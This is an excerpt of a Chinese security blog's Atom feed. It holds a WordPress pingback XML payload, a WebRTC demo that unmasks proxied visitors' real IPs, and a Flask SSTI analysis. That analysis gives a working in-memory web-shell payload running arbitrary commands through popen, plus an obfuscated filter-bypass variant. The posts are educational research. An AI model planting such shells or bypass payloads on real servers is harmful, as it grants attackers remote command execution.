class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">methodCall</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>pingback.ping<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">params</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>file:///var/log/apache2/access_log<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>http://localhost/wordpress/?p=1<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">params</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">methodCall</span>&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="PHP" scheme="https://www.mi1k7ea.com/categories/PHP/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://www.mi1k7ea.com/tags/PHP/"/>
    
      <category term="WordPress" scheme="https://www.mi1k7ea.com/tags/WordPress/"/>
    
  </entry>
  
  <entry>
    <title>通过WebRTC获取代理池中攻击者真实IP</title>
    <link href="https://www.mi1k7ea.com/2021/04/20/%E9%80%9A%E8%BF%87WebRTC%E8%8E%B7%E5%8F%96%E4%BB%A3%E7%90%86%E6%B1%A0%E4%B8%AD%E6%94%BB%E5%87%BB%E8%80%85%E7%9C%9F%E5%AE%9EIP/"/>
    <id>https://www.mi1k7ea.com/2021/04/20/通过WebRTC获取代理池中攻击者真实IP/</id>
    <published>2021-04-20T15:06:35.000Z</published>
    <updated>2021-05-29T07:58:08.108Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>参考学蚁致用的文章：<a href="https://mp.weixin.qq.com/s/qEEO-1lyFbYS7Saa2L-n0A" target="_blank" rel="noopener">【热剩饭】获取代理池背后攻击者的真实IP</a></p><h2 id="0x01-WebRTC"><a href="#0x01-WebRTC" class="headerlink" title="0x01 WebRTC"></a>0x01 WebRTC</h2><p>WebRTC (Web Real-Time Communications) 是一项实时通讯技术，它允许网络应用或者站点，在不借助中间媒介的情况下，建立浏览器之间点对点（Peer-to-Peer）的连接，实现视频流和（或）音频流或者其他任意数据的传输。WebRTC包含的这些标准使用户在无需安装任何插件或者第三方的软件的情况下，创建点对点（Peer-to-Peer）的数据分享和电话会议成为可能。</p><p>WebRTC支持发送UDP请求。</p><p>WebRTC相关API参考：<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/WebRTC_API" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/API/WebRTC_API</a></p><h2 id="0x02-通过WebRTC获取代理池中攻击者真实IP"><a href="#0x02-通过WebRTC获取代理池中攻击者真实IP" class="headerlink" title="0x02 通过WebRTC获取代理池中攻击者真实IP"></a>0x02 通过WebRTC获取代理池中攻击者真实IP</h2><h3 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h3><p>攻击者一般都喜欢使用Socks5类型的代理池来隐藏自己的真实IP。Socks5协议本身是支持UDP协议的，但是大多数的代理客户端并没有去实现。</p><p>因此，如果攻击者使用的Socks5类型代理只是转发所有的TCP请求而不支持UDP请求，那么就可以在网页上发起一个UDP请求从而获取到攻击者的真实出口IP。</p><h3 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h3><p>WebRTC支持UDP协议，而且在大多数浏览器中都是默认开启的。</p><p>即使Socks5代理支持UDP协议，但是WebRTC并不会走代理，因为其设计之初就是为了点对点通信。</p><p>webrtc.php：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">        &lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span>&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">    &lt;body&gt;</span><br><span class="line">        Remote Addr: <span class="meta">&lt;?</span>=$_SERVER[<span class="string">'REMOTE_ADDR'</span>]<span class="meta">?&gt;</span></span><br><span class="line">        &lt;hr&gt;</span><br><span class="line">        &lt;h3&gt;WebRTC&lt;/h3&gt;</span><br><span class="line">        &lt;h4&gt;Your local IP addresses:&lt;/h4&gt;</span><br><span class="line">        &lt;ul id=<span class="string">"localip"</span>&gt;&lt;/ul&gt;</span><br><span class="line">        &lt;h4&gt;Your <span class="keyword">public</span> IP addresses:&lt;/h4&gt;</span><br><span class="line">        &lt;ul id=<span class="string">"publicip"</span>&gt;&lt;/ul&gt;</span><br><span class="line">        &lt;h4&gt;Your IPv6 addresses:&lt;/h4&gt;</span><br><span class="line">        &lt;ul id=<span class="string">"ipv6"</span>&gt;&lt;/ul&gt;</span><br><span class="line">        &lt;iframe id=<span class="string">"rtc_iframe"</span> sandbox=<span class="string">"allow-same-origin"</span> style=<span class="string">"display: none"</span>&gt;&lt;/iframe&gt;</span><br><span class="line">        &lt;script&gt;</span><br><span class="line">            <span class="comment">//get the IP addresses associated with an account</span></span><br><span class="line">            <span class="function"><span class="keyword">function</span> <span class="title">getIPs</span><span class="params">(callback)</span></span>&#123;</span><br><span class="line">                <span class="keyword">var</span> ip_dups = &#123;&#125;;</span><br><span class="line">                <span class="comment">//compatibility for firefox and chrome</span></span><br><span class="line">                <span class="keyword">var</span> RTCPeerConnection = window.RTCPeerConnection</span><br><span class="line">                    || window.mozRTCPeerConnection</span><br><span class="line">                    || window.msRTCPeerConnection</span><br><span class="line">                    || window.webkitRTCPeerConnection;</span><br><span class="line">                <span class="keyword">var</span> useWebKit = !!window.webkitRTCPeerConnection;</span><br><span class="line">                <span class="comment">//bypass naive webrtc blocking using an iframe</span></span><br><span class="line">                <span class="keyword">if</span>(!RTCPeerConnection)&#123;</span><br><span class="line">                    <span class="keyword">var</span> win = document.getElementById(<span class="string">"rtc_iframe"</span>).contentWindow;</span><br><span class="line">                    RTCPeerConnection = win.RTCPeerConnection</span><br><span class="line">                        || win.mozRTCPeerConnection</span><br><span class="line">                        || win.msRTCPeerConnection</span><br><span class="line">                        || win.webkitRTCPeerConnection;</span><br><span class="line">                    useWebKit = !!win.webkitRTCPeerConnection;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//minimal requirements for data connection</span></span><br><span class="line">                <span class="keyword">var</span> mediaConstraints = &#123;</span><br><span class="line">                    optional: [&#123;RtpDataChannels: <span class="keyword">true</span>&#125;]</span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">var</span> servers = &#123;</span><br><span class="line">                  iceServers: [</span><br><span class="line">                    &#123;</span><br><span class="line">                      urls: [</span><br><span class="line">                        <span class="string">'stun:stun.l.google.com:19302?transport=udp'</span>,</span><br><span class="line">                        <span class="string">'stun:stun1.l.google.com:19302?transport=udp'</span>,</span><br><span class="line">                        <span class="string">'stun:stun2.l.google.com:19302?transport=udp'</span>,</span><br><span class="line">                        <span class="string">'stun:stun3.l.google.com:19302?transport=udp'</span>,</span><br><span class="line">                        <span class="string">'stun:stun4.l.google.com:19302?transport=udp'</span>,</span><br><span class="line">                        <span class="string">"stun:stun.ekiga.net?transport=udp"</span>,</span><br><span class="line">                        <span class="string">"stun:stun.ideasip.com?transport=udp"</span>,</span><br><span class="line">                        <span class="string">"stun:stun.rixtelecom.se?transport=udp"</span>,</span><br><span class="line">                        <span class="string">"stun:stun.schlund.de?transport=udp"</span>,</span><br><span class="line">                        <span class="string">"stun:stun.stunprotocol.org:3478?transport=udp"</span>,</span><br><span class="line">                        <span class="string">"stun:stun.voiparound.com?transport=udp"</span>,</span><br><span class="line">                        <span class="string">"stun:stun.voipbuster.com?transport=udp"</span>,</span><br><span class="line">                        <span class="string">"stun:stun.voipstunt.com?transport=udp"</span>,</span><br><span class="line">                        <span class="string">"stun:stun.voxgratia.org?transport=udp"</span></span><br><span class="line">                      ]</span><br><span class="line">                    &#125;</span><br><span class="line">                  ]</span><br><span class="line">                &#125;;</span><br><span class="line">                <span class="comment">//construct a new RTCPeerConnection</span></span><br><span class="line">                <span class="keyword">var</span> pc;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                  pc = <span class="keyword">new</span> RTCPeerConnection(servers, mediaConstraints);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                  <span class="keyword">return</span></span><br><span class="line">                &#125;</span><br><span class="line">                <span class="function"><span class="keyword">function</span> <span class="title">handleCandidate</span><span class="params">(candidate)</span></span>&#123;</span><br><span class="line">                  <span class="comment">//match just the IP address</span></span><br><span class="line">                  <span class="keyword">var</span> ip_regex = /([<span class="number">0</span><span class="number">-9</span>]&#123;<span class="number">1</span>,<span class="number">3</span>&#125;(\.[<span class="number">0</span><span class="number">-9</span>]&#123;<span class="number">1</span>,<span class="number">3</span>&#125;)&#123;<span class="number">3</span>&#125;|[a-f0<span class="number">-9</span>]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;(:[a-f0<span class="number">-9</span>]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;)&#123;<span class="number">7</span>&#125;)/</span><br><span class="line">                  <span class="keyword">var</span> ip_addr = ip_regex.exec(candidate)[<span class="number">1</span>];</span><br><span class="line">                  <span class="comment">//remove duplicates</span></span><br><span class="line">                  <span class="keyword">if</span>(ip_dups[ip_addr] === undefined)</span><br><span class="line">                      callback(ip_addr);</span><br><span class="line">                  ip_dups[ip_addr] = <span class="keyword">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//listen for candidate events</span></span><br><span class="line">                pc.onicecandidate = <span class="function"><span class="keyword">function</span><span class="params">(ice)</span></span>&#123;</span><br><span class="line">                  <span class="comment">//skip non-candidate events</span></span><br><span class="line">                  <span class="keyword">if</span>(ice.candidate)</span><br><span class="line">                    handleCandidate(ice.candidate.candidate);</span><br><span class="line">                &#125;;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//create a bogus data channel</span></span><br><span class="line">                pc.createDataChannel(<span class="string">"bl"</span>);</span><br><span class="line">                <span class="comment">//create an offer sdp</span></span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                  pc.createOffer().then(<span class="function"><span class="keyword">function</span><span class="params">(result)</span> </span>&#123;</span><br><span class="line">                    pc.setLocalDescription(result);</span><br><span class="line">                  &#125;);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                  pc.createOffer().then(<span class="function"><span class="keyword">function</span><span class="params">(result)</span> </span>&#123;</span><br><span class="line">                    pc.setLocalDescription(result, <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;&#125;, <span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;&#125;);</span><br><span class="line">                  &#125;, <span class="function"><span class="keyword">function</span><span class="params">()</span> </span>&#123;&#125;);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//wait for a while to let everything done</span></span><br><span class="line">                setTimeout(<span class="function"><span class="keyword">function</span><span class="params">()</span></span>&#123;</span><br><span class="line">                    <span class="comment">//read candidate info from local description</span></span><br><span class="line">                    <span class="keyword">var</span> lines = pc.localDescription.sdp.split(<span class="string">'\n'</span>);</span><br><span class="line"></span><br><span class="line">                    lines.<span class="keyword">forEach</span>(<span class="function"><span class="keyword">function</span><span class="params">(line)</span></span>&#123;</span><br><span class="line">                      <span class="keyword">if</span>(line.indexOf(<span class="string">'a=candidate:'</span>) === <span class="number">0</span>)</span><br><span class="line">                        handleCandidate(line);</span><br><span class="line">                    &#125;);</span><br><span class="line">                &#125;, <span class="number">1000</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//insert IP addresses into the page</span></span><br><span class="line">            getIPs(<span class="function"><span class="keyword">function</span><span class="params">(ip)</span></span>&#123;</span><br><span class="line">                <span class="keyword">var</span> li = document.createElement(<span class="string">"li"</span>);</span><br><span class="line">                li.textContent = ip;</span><br><span class="line">                <span class="comment">//local IPs</span></span><br><span class="line">                <span class="keyword">if</span> (ip.match(/^(<span class="number">192</span>\<span class="number">.168</span>\.|<span class="number">169</span>\<span class="number">.254</span>\.|<span class="number">10</span>\.|<span class="number">172</span>\.(<span class="number">1</span>[<span class="number">6</span><span class="number">-9</span>]|<span class="number">2</span>\d|<span class="number">3</span>[<span class="number">01</span>]))/))</span><br><span class="line">                  document.getElementById(<span class="string">"localip"</span>).appendChild(li);</span><br><span class="line">                <span class="comment">//IPv6 addresses</span></span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span> (ip.match(/^[a-f0<span class="number">-9</span>]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;(:[a-f0<span class="number">-9</span>]&#123;<span class="number">1</span>,<span class="number">4</span>&#125;)&#123;<span class="number">7</span>&#125;$/))</span><br><span class="line">                  document.getElementById(<span class="string">"ipv6"</span>).appendChild(li);</span><br><span class="line">                <span class="comment">//assume the rest are public IPs</span></span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                  document.getElementById(<span class="string">"publicip"</span>).appendChild(li);</span><br><span class="line">            &#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>使用Socks5代理访问，成功获取到真实出口IP：</p><p><img src="/2021/04/20/通过WebRTC获取代理池中攻击者真实IP/1.png" alt=""></p><h3 id="云函数代理池测试"><a href="#云函数代理池测试" class="headerlink" title="云函数代理池测试"></a>云函数代理池测试</h3><p>待测试分析…</p><h3 id="红蓝对抗借鉴"><a href="#红蓝对抗借鉴" class="headerlink" title="红蓝对抗借鉴"></a>红蓝对抗借鉴</h3><h4 id="红队"><a href="#红队" class="headerlink" title="红队"></a>红队</h4><ul><li>专用打点浏览器，禁掉WebRTC功能：<ul><li>Chrome：在Chrome应用商店里，安装一个名为WebRTC Leak Prevent的扩展，然后选择Disable non-proxied UDP(force proxy)即可。</li><li>Firefox：在浏览器上输入<code>about:config</code>，之后搜索<code>media.peerconnection.enabled</code>，找到它后双击，将其改成false即可。</li></ul></li><li>改用VPN；</li><li>禁掉了WebRTC后，推荐用热点，再挂代理池；</li></ul><h4 id="蓝队"><a href="#蓝队" class="headerlink" title="蓝队"></a>蓝队</h4><ul><li>外网打点页面嵌入，如WAF拦截页面；</li><li>蜜罐页面嵌入；</li><li>不仅局限于WebRTC，研究其他基于UDP协议的功能；</li></ul>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="红队" scheme="https://www.mi1k7ea.com/categories/%E7%BA%A2%E9%98%9F/"/>
    
    
      <category term="渗透测试" scheme="https://www.mi1k7ea.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="红队" scheme="https://www.mi1k7ea.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
  </entry>
  
  <entry>
    <title>浅析Python Flask内存马</title>
    <link href="https://www.mi1k7ea.com/2021/04/07/%E6%B5%85%E6%9E%90Python-Flask%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>https://www.mi1k7ea.com/2021/04/07/浅析Python-Flask内存马/</id>
    <published>2021-04-07T11:32:22.000Z</published>
    <updated>2021-04-27T07:59:41.817Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近看到一个Python Flask内存马，学习一下：<a href="https://github.com/iceyhexman/flask_memory_shell" target="_blank" rel="noopener">https://github.com/iceyhexman/flask_memory_shell</a></p><h2 id="0x01-Python-Flask内存马"><a href="#0x01-Python-Flask内存马" class="headerlink" title="0x01 Python Flask内存马"></a>0x01 Python Flask内存马</h2><h3 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h3><p>简单写个Flask SSTI漏洞环境：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">home</span><span class="params">()</span>:</span></span><br><span class="line">    person = <span class="string">'guest'</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">'name'</span>):</span><br><span class="line">        person = request.args.get(<span class="string">'name'</span>)</span><br><span class="line">    template = <span class="string">'&lt;h2&gt;Hello %s!&lt;/h2&gt;'</span> % person</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure><p>原始Flask内存马payload，其中的默认命令也可以去掉：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](<span class="string">"app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read())"</span>,&#123;<span class="string">'_request_ctx_stack'</span>:url_for.__globals__[<span class="string">'_request_ctx_stack'</span>],<span class="string">'app'</span>:url_for.__globals__[<span class="string">'current_app'</span>]&#125;)</span><br></pre></td></tr></table></figure><p>访问如下URL生成Flask内存马：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/?name=&#123;&#123;url_for.__globals__[%27__builtins__%27][%27eval%27](%22app.add_url_rule(%27/shell%27,%20%27shell%27,%20lambda%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.args.get(%27cmd%27,%20%27whoami%27)).read())%22,&#123;%27_request_ctx_stack%27:url_for.__globals__[%27_request_ctx_stack%27],%27app%27:url_for.__globals__[%27current_app%27]&#125;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>最后访问/shell内存马接口即可执行任意命令：</p><p><img src="/2021/04/07/浅析Python-Flask内存马/1.png" alt=""></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>我们将payload拆开来逐层分析：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">'__builtins__'</span>][<span class="string">'eval'</span>](</span><br><span class="line"><span class="string">"app.add_url_rule(</span></span><br><span class="line"><span class="string">'/shell', </span></span><br><span class="line"><span class="string">'shell', </span></span><br><span class="line"><span class="string">lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'whoami')).read()</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">"</span>,</span><br><span class="line">&#123;</span><br><span class="line"><span class="string">'_request_ctx_stack'</span>:url_for.__globals__[<span class="string">'_request_ctx_stack'</span>],</span><br><span class="line"><span class="string">'app'</span>:url_for.__globals__[<span class="string">'current_app'</span>]</span><br><span class="line">&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h4 id="url-for-globals-39-builtins-39-39-eval-39"><a href="#url-for-globals-39-builtins-39-39-eval-39" class="headerlink" title="url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]"></a><code>url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]</code></h4><p>这个是Flask SSTI中的payload。</p><p>url_for()是Flask的一个内置函数：</p><p><img src="/2021/04/07/浅析Python-Flask内存马/3.png" alt=""></p><p>通过Flask内置函数可以调用其<code>__globals__</code>属性，该特殊属性能够返回函数所在模块命名空间的所有变量，其中包含了很多已经引入的modules，这里看到是支持<code>__builtins__</code>的：</p><p><img src="/2021/04/07/浅析Python-Flask内存马/4.png" alt=""></p><p><code>__builtins__</code>即是引用，Python程序一旦启动，它就会在程序员所写的代码运行之前就已经被加载到内存中了，而对于<code>__builtins__</code>却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块。其中是包含eval、exec等函数的：</p><p><img src="/2021/04/07/浅析Python-Flask内存马/5.png" alt=""></p><p>直接调用就能执行命令了：</p><p><img src="/2021/04/07/浅析Python-Flask内存马/6.png" alt=""></p><h4 id="app-add-url-rule-函数"><a href="#app-add-url-rule-函数" class="headerlink" title="app.add_url_rule()函数"></a>app.add_url_rule()函数</h4><p>在Flask中注册路由的时候是添加的<a href="mailto:`@app.route" target="_blank" rel="noopener">`@app.route</a>()`装饰器来实现的。</p><p>点进去看到其源码实现，其调用了add_url_rule()函数来添加路由：</p><p><img src="/2021/04/07/浅析Python-Flask内存马/2.png" alt=""></p><p>add_url_rule()函数定义：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">add_url_rule(rule, endpoint=<span class="keyword">None</span>, view_func=<span class="keyword">None</span>, provide_automatic_options=<span class="keyword">None</span>, **options)</span><br></pre></td></tr></table></figure><p>参数说明：</p><ul><li>rule：函数对应的URL规则，满足条件和app.route()的第一个参数一样，必须以<code>/</code>开头；</li><li>endpoint：端点，即在使用url_for()进行反转的时候，这里传入的第一个参数就是endpoint对应的值。这个值也可以不指定，那么默认就会使用函数的名字作为endpoint的值；</li><li>view_func：URL对应的函数（注意，这里只需写函数名字而不用加括号）；</li><li>provide_automatic_options：控制是否应自动添加选项方法。这也可以通过设置视图来控制_func.provide_automatic_options =添加规则前为False；</li><li>options：要转发到基础规则对象的选项。Werkzeug的一个变化是处理方法选项。方法是此规则应限制的方法列表（GET、POST等）。默认情况下，规则只侦听GET（并隐式地侦听HEAD）。从Flask0.6开始，通过标准请求处理隐式添加和处理选项；</li></ul><p>由此可见，payload这部分是动态添加了一条路由，而处理该路由的函数是个由lambda关键字定义的匿名函数。</p><h4 id="lambda与-request-ctx-stack"><a href="#lambda与-request-ctx-stack" class="headerlink" title="lambda与_request_ctx_stack"></a>lambda与_request_ctx_stack</h4><p>lambda即匿名函数，payload中add_url_rule()函数的第三个参数定义了一个lambda匿名函数，其中通过os库的popen()函数执行从Web请求中获取的cmd参数值并返回结果，其中该参数值默认为whoami。</p><p><code>_request_ctx_stack</code>是Flask的一个全局变量，是一个LocalStack实例。</p><p>Flask请求上下文管理机制：当一个请求进入Flask，首先会实例化一个Request Context，这个上下文封装了请求的信息在Request中，并将这个上下文推入到一个名为<code>_request_ctx_stack</code> 的栈结构中，也就是说获取当前的请求上下文等同于获取<code>_request_ctx_stack</code>的栈顶元素<code>_request_ctx_stack.top</code> 。</p><h3 id="绕过变形"><a href="#绕过变形" class="headerlink" title="绕过变形"></a>绕过变形</h3><p>以Python沙箱逃逸的技巧为例：</p><ul><li><code>url_for</code>可用<code>get_flashed_messages</code>或<code>request.application.__self__._get_data_for_json</code>等替换；</li><li>代码执行函数替换，如exec等替换eval；</li><li>字符串可采用拼接方式，如<code>[&#39;__builtins__&#39;][&#39;eval&#39;]</code>变为<code>[&#39;__bui&#39;+&#39;ltins__&#39;][&#39;ev&#39;+&#39;al&#39;]</code>；</li><li><code>__globals__</code>可用<code>__getattribute__(&#39;__globa&#39;+&#39;ls__&#39;)</code>替换；</li><li><code>[]</code>中括号可用<code>.__getitem__()</code>或<code>.pop()</code>替换；</li><li>…</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.application.__self__._get_data_for_json.__getattribute__(<span class="string">'__globa'</span>+<span class="string">'ls__'</span>).__getitem__(<span class="string">'__bui'</span>+<span class="string">'ltins__'</span>).__getitem__(<span class="string">'ex'</span>+<span class="string">'ec'</span>)(<span class="string">"app.add_url_rule('/shell', 'shell', lambda :__import__('os').popen(_request_ctx_stack.top.request.args.get('cmd', 'calc')).read())"</span>,&#123;<span class="string">'_request_ct'</span>+<span class="string">'x_stack'</span>:get_flashed_messages.__getattribute__(<span class="string">'__globa'</span>+<span class="string">'ls__'</span>).pop(<span class="string">'_request_'</span>+<span class="string">'ctx_stack'</span>),<span class="string">'app'</span>:get_flashed_messages.__getattribute__(<span class="string">'__globa'</span>+<span class="string">'ls__'</span>).pop(<span class="string">'curre'</span>+<span class="string">'nt_app'</span>)&#125;)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="Python" scheme="https://www.mi1k7ea.com/categories/Python/"/>
    
    
      <category term="Web安全" scheme="https://www.mi1k7ea.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="Python" scheme="https://www.mi1k7ea.com/tags/Python/"/>
    
      <category term="SSTI" scheme="https://www.mi1k7ea.com/tags/SSTI/"/>
    
      <category term="内存马" scheme="https://www.mi1k7ea.com/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
  </entry>
  
  <entry>
    <title>浅析WebLogic JNDI注入RCE（CVE-2021-2109）</title>
    <link href="https://www.mi1k7ea.com/2021/04/06/%E6%B5%85%E6%9E%90WebLogic-JNDI%E6%B3%A8%E5%85%A5RCE%EF%BC%88CVE-2021-2109%EF%BC%89/"/>
    <id>https://www.mi1k7ea.com/2021/04/06/浅析WebLogic-JNDI注入RCE（CVE-2021-2109）/</id>
    <published>2021-04-06T07:52:57.000Z</published>
    <updated>2021-04-06T13:02:07.802Z</updated>
    
